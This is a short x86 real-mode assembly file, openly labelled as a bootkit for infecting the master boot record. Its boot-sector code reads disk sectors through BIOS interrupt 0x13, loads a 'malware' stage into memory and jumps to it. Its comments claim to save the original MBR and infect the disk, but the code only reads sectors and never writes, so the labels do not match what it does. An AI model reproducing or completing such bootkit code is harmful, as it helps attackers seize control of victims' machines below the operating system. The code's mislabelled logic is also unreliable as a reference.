; 🔴 Bootkit - MBR Infect
[BITS 16]
[ORG 0x7C00]

start:
    ; Save original MBR
    mov ax, 0x0201
    mov bx, 0x7E00
    mov cx, 0x0001
    mov dx, 0x0080
    int 0x13
    
    ; Load malware
    mov ax, 0x0202
    mov bx, 0x8000
    mov cx, 0x0002
    mov dx, 0x0080
    int 0x13
    
    ; Jump to malware
    jmp 0x0000:0x8000
    
times 510-($-$$) db 0
dw 0xAA55